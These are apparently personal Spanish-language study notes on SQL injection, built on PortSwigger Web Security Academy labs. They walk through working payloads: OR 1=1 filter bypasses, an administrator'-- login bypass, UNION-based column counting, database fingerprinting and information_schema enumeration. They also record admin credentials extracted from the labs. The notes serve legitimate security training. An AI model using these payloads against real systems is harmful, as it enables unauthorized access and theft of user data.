# SQL Injection

La info siguiente es de la pagina oficial de portsiwgger

## Que es
La inyección SQL (SQLi) es una vulnerabilidad de seguridad web que permite a un atacante interferir con las consultas que una aplicación realiza a su base de datos. Esto puede permitir que un atacante vea datos que normalmente no puede recuperar. Esto puede incluir datos que pertenecen a otros usuarios o cualquier otro dato al que la aplicación pueda acceder. En muchos casos, un atacante puede modificar o eliminar estos datos, lo que provoca cambios persistentes en el contenido o el comportamiento de la aplicación.

## Como detectar
Se pueden detectar manualmente

- El carácter de comilla simple 'y busque errores u otras anomalías. -> Provocará que termine la consulta e inicie los comandos a ejecutar o eliminar
- Algunas sintaxis específicas de SQL que evalúan el valor base (original) del punto de entrada y un valor diferente, y buscan diferencias sistemáticas en las respuestas de la aplicación.
- Condiciones booleanas como OR 1=1y OR 1=2, y buscan diferencias en las respuestas de la aplicación. Son formas de enviar un true o false y ver como reacciona la aplicación
- Cargas útiles diseñadas para activar retrasos de tiempo cuando se ejecutan dentro de una consulta SQL y buscar diferencias en el tiempo que tarda en responder. Es para identicar sentencias, generas una donde conoces que será un error y evaluas el tiempo de respuesta, y tambien con las que son verdaderas sabras que el tiempo de respuesta es lo que describe a la aplicación
- Cargas útiles OAST diseñadas para activar una interacción de red fuera de banda cuando se ejecutan dentro de una consulta SQL y monitorear cualquier interacción resultante. (Me parece que son las que envian la respuesta de los resultados a otra parte, fuera de la consulta, como puede ser un archivo de texto)

##Donde viene
La mayoría de las vulnerabilidades de inyección SQL se producen dentro de la WHEREcláusula de una SELECTconsulta. La mayoría de los evaluadores con experiencia están familiarizados con este tipo de inyección SQL.
Sin embargo, las vulnerabilidades de inyección SQL pueden ocurrir en cualquier lugar dentro de la consulta y en diferentes tipos de consultas. Otros lugares comunes donde se producen las inyecciones SQL son:

En UPDATE las declaraciones, dentro de los valores actualizados o de la WHEREcláusula.
En INSERT las declaraciones, dentro de los valores insertados.
En SELECT declaraciones, dentro del nombre de la tabla o columna.
En SELECT los enunciados, dentro de la ORDER BY cláusula.

##Ejemplos de inyeccion SQL

There are lots of SQL injection vulnerabilities, attacks, and techniques, that occur in different situations. Some common SQL injection examples include:

Retrieving hidden data, where you can modify a SQL query to return additional results. //Recuperación de datos ocultos , donde puede modificar una consulta SQL para devolver resultados adicionales.
Subverting application logic, where you can change a query to interfere with the application's logic. //Subvertir la lógica de la aplicación , donde puedes cambiar una consulta para interferir con la lógica de la aplicación.
UNION attacks, where you can retrieve data from different database tables. //Ataques UNION , donde puedes recuperar datos de diferentes tablas de bases de datos.
Blind SQL injection, where the results of a query you control are not returned in the application's responses. //Inyección SQL ciega , donde los resultados de una consulta que usted controla no se devuelven en las respuestas de la aplicación.


# LABS


## LAB 1 Retrieving hidden data
El clasico que manda verdadero, aunque tambien puede ser un false

'OR 1=1--
'OR+1=1--
```
https://insecure-website.com/products?category=Gifts'--

SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1

https://insecure-website.com/products?category=Gifts'+OR+1=1--

SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```
Inyección: 'OR+1=1--

## LAB 2 Subverting application logic

Este lo hace en login pero podría ser cualquier cosa

```
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```
Inyección
administrator'--

## LAB 3 Retrieving data from other database tables (UNION)
Traer datos de otra tabla suena interesante

Requisitos que no dicen:
-Debes conocer el nombre de la otra tabla
-Debes conocer el numero de parametros que hace la consulta (Depende el manejador de base de datos para hacer UNION deberas consultar la misma contidad de datos de la cosulta original)
-Debes conocer el tipo de dato que se esta enviando (Lo mismo depende el navegador, y como este configurada la aplicación de los contrario no funcionará)

*Me cagan los laboratorios idelalistas

```
SELECT name, description FROM products WHERE category = 'Gifts'
La inyección seria
' UNION SELECT username, password FROM users--
Resultado
SELECT name, description FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users--
```
Acá ya hablan de los requisitos: https://portswigger.net/web-security/sql-injection/union-attacks

Lo básico: La UNIONpalabra clave permite ejecutar una o más SELECTconsultas adicionales y agregar los resultados a la consulta original. Por ejemplo:
```
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```
Esta consulta SQL devuelve un único conjunto de resultados con dos columnas, que contiene valores de las columnas ay ben table1y las columnas cy den table2.

**Para que una UNION consulta funcione, se deben cumplir dos requisitos clave**

-Las consultas individuales deben devolver el mismo número de columnas.
-Los tipos de datos de cada columna deben ser compatibles entre las consultas individuales.

### Determinar el número de columnas necesarias

** Metodo 1 **
Un método implica inyectar una serie de ORDER BY cláusulas e incrementar el índice de la columna especificada hasta que se produzca un error. Por ejemplo, si el punto de inyección es una cadena entre comillas dentro de la WHEREcláusula de la consulta original, deberá enviar lo siguiente:
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```
 Cuando el índice de columna especificado supera la cantidad de columnas reales en el conjunto de resultados, la base de datos devuelve un error, como el siguiente:
```
The ORDER BY position number 3 is out of range of the number of items in the select list.
```


** Metodo 2 **
El segundo método implica enviar una serie de UNION SELECTcargas útiles que especifican un número diferente de valores nulos:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```
Ejemplo de error:
```
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```
PROs de Null
- NULL es convertible a cualquier tipo de datos común, por lo que maximiza la posibilidad de que la carga útil tenga éxito cuando el recuento de columnas sea correcto.
- Si tiene suerte, verá algún contenido adicional dentro de la respuesta, como una fila adicional en una tabla HTML

Contras de NULL
- los valores nulos podrían desencadenar un error diferente, como un NullPointerException.
- En el peor de los casos, la respuesta podría parecer igual a una respuesta causada por una cantidad incorrecta de valores nulos

**NOTA:**
Ahora depende del manejador de base de datos, como estén configurados los errores dentro de la aplicación o dentro del mismo manejador de base datos, por lo que se puede esperar una respuesta generica o ningún resultado, la intención es detectar alguna diferencia en la respuesta.

### Laboratorio
Aquí en el laboratio la parte inyectable con union fue la tabla principal, por un momento creí que sera el articulo pero despues de probar, note que no era,  ambas mandaronn un error cuando no coincide el numero, pero lo interesante fue en la tabla principal ya que añade una fila extra vacia justo como se menciona en las notas
```
https://PERSONALID.web-security-academy.net/filter?category=Accessories%27UNION%20SELECT%20NULL,NULL,NULL--
```

### Sintaxis especifica de la base de datos
La sintaxis puede variar segun la base de datos aca algunos ejemplos que segun chatgpt son los adecuados:
```
ORACLE
UNION SELECT 'Other Value', 2 FROM DUAL;

DB2
UNION SELECT 'Other Value', 2 FROM SYSIBM.SYS
```
### Determinar el tipo de datos 
Después de determinar la cantidad de columnas requeridas, puede probar cada columna para comprobar si puede contener datos de cadena. Puede enviar una serie de UNION SELECTcargas útiles que coloquen un valor de cadena en cada columna, una por una. Por ejemplo, si la consulta devuelve cuatro columnas, debe enviar:

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
Si no es compatible el tipo de datos mandara un error (depende como manejaron los errore en la aplicación)
```
Conversion failed when converting the varchar value 'a' to data type int.

```
Si no se produce ningún error y la respuesta de la aplicación contiene algún contenido adicional, incluido el valor de la cadena inyectada, entonces la columna relevante es adecuada para recuperar datos de la cadena.

### Laboratorio
Aca el lab te pide que identificques el tipo de dato de cada parametro y que ingreses una fila con la info aleatoria que te da:
```
https://PERSONALID.web-security-academy.net/filter?category=Lifestyle' UNION SELECT 88,'W51CBg',88--
```
Aca la situción de este laboratorio me da curiosidad pero que en el valor 'W51CBg' se esta utilizando la comilla simple, la misma que necesitamos para cerrar o terminar la consulta e iniciar la inyección

```
SELECT * FROM products WHERE category = 'Gifts'UNION SELECT 88,'W51CBg',88--
```
No, si esta bien la comilla simple jejeje crei que se necesitaria comilla doble "

###Obtener datos interesantes
Suponiendo la siguiente consulta:
- La consulta original devuelve dos columnas, ambas pueden contener datos de cadena.
- El punto de inyección es una cadena entre comillas dentro de la clausula WHERE .
- La base de datos contiene una tabla llamada userscon las columnas username y password.
- El resultado de la consulta va a una tabla html


En este ejemplo, puede recuperar el contenido de la userstabla enviando la entrada:
```
' UNION SELECT username, password FROM users--
```

### Lab
EL nuevo lab 
-  La vulnerabilidad esta en el filtro de la categoria del producto
-  la base de datos continue una tabla llamada users xon las columnas de users y  password

Procedimiento
- Encontrar donde es inyectable - Listo 
- Identificar la candidad de campos - Son 2
- Identificar el tipo de camps - Son de tipo cadena
- Realizar la consulta de los usuarios -
```
'UNION SELECT username, password FROM users--
```
- Loguarse con las credenciales de administrator
```
administrator
f1vpyh0esuo1b2yglin0
```

### Examining the database in SQL injection attacks

Para explotar una inyección SQL  es necesario conocer la información de la base de datos, es incluye lo siguiente;
- Tipo y versión del software de la base de datos (SQL/NoSQL, MYSQL ver 1.2)
- Tablas y columnas de la base de datos (Inclusive las bases de datos que tiene almacenadas)

| Database | Query |
| --- | --- |
| Microsoft, MySQL | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` |
| PostgreSQL | `SELECT version()` |

### Laboratorio version de oracle

Procedimiento
- Encontrar donde es inyectable - El mismo
- Identificar la candidad de campos  - Son 2 - recuerda usar FROM DUAL
- Identificar el tipo de camps  - Ambas varchar
- Realizar la consulta de la version de oracle - Selecciona el comando adecuado
- 
```
https://Personalid.web-security-academy.net/filter?category=Accessories%27UNION%20SELECT%20NULL,BANNER%20FROM%20v$version--

Depende la versión de oracle existen diferentes columnas, pero parece que el laboratorio busca de manera especifica este comando existen diferentes pero este es el que funciona

https://Personalid.web-security-academy.net/filter?category=Accessories'UNION SELECT NULL,BANNER FROM v$version--
```
### Laboratorio version de mysql
```
https://*****.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,@@version-- dsad

Se mamo era por el espacio despues del comentario, intente el # pero no funciono, tener en cuenta como se hacen los comentarios segun la base de datos

Segun la solucion era con el #
ademas en lugar del espacio ponen el +
```

### Listar contenido de la base de datos
Dice que la mayoria de las bases de datos tienen vistas para llamar la información del esquema que provee la información de la base de datos, todas excepto oracle y segun mi investigación db2 debes tener en cuenta la versión ya que hay una consulta en stackoverflow que es gigante a comparación de las otras   
Para listar esquema de manera general esta el siguiente comando:
```
SELECT * FROM information_schema.tables

La salida es/son todas las tablas
```

Una vez que obtienes la información de las tablas, puedes obtener la información de las columnas:
```
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```
### Laboratorio contenido de la base de datos
Procedimiento
- Encontrar donde es inyectable - SI
- Identificar la candidad de campos  - 2
- Identificar el tipo de camps  - VARCHAR
- Identificar base de datos
- Identificar tablas - si pero sus comandos no funcionaron
- Identificar columnas - si pero sus comandos no funcionaron
- Realizar la consulta de los usuarios  - 
- Loguearse xomo administrador
```
PASO 1 IDENTIFICAR EL PARAMENTRO VULNERABLE // ES EL MISMO DEL FILTRO

'UNION SELECT NULL,version()--  //Es postgresql

PASO 2 IDENTIFICAR EL NUMERO DE CAMPOS 

'UNION SELECT NULL,NULL--  //SON LOS 2 DE SIEMPRE

PASO 3 INDEITIFICAR QUE TIPO DE DATOS SON LOS CAMPOS // VARCHAR

'UNION SELECT NULL,'A'--  
'UNION SELECT 'A',NULL--  
'UNION SELECT 'A','A'--  

PASO 4 IDENTIFICAR LAS TABLAS

'UNION SELECT table_name,NULL FROM information_schema.tables-- //FUNCIONA PERO LISTA TABLAS DEL SISTEMA 

'UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE'-- // ESTE FILTRA Y PONE SOLO LAS TABLAS CREADAS POR EL USUARIO

RESULTADO FINAL:
https://ID.web-security-academy.net/filter?category=Lifestyle'UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE'--

RESULTADO: users_xrkoxi

PASO 5 IDENTIFICAR LAS COLUMNAS

SELECT column_name,data_type FROM information_schema.columns WHERE table_name = 'users_xrkoxi'-- // OBTIENE LAS COLUMNAS DE LA TABLA


RESULTADO

username_lkcolf
character varying

password_khjyrl
character varying

Y LA EMAIL PERO NO LA COPIE

PASO 6 REALIZAR CONSULTA DE LOS USUARIOS

SELECT username_lkcolf,password_khjyrl FROM 'users_xrkoxi'--

RESULTADO
https://ID.web-security-academy.net/filter?category=Lifestyle'UNION SELECT username_lkcolf,password_khjyrl FROM users_xrkoxi--

USER:administrator
PASS:ubkfkbwgny54kk6o2yx2

FUENTE DE LOS COMANDOS STACKOVERFLOW
```
Con UNION
1. Determinar la cantidas de elementos *Verifica la sintaxis*
2. Determinar el tipo de datos
3. Obtener datos interesantes

## LAB 2 Subverting application logic
## LAB 2 Subverting application logic
## LAB 2 Subverting application logic
## LAB 2 Subverting application logic


























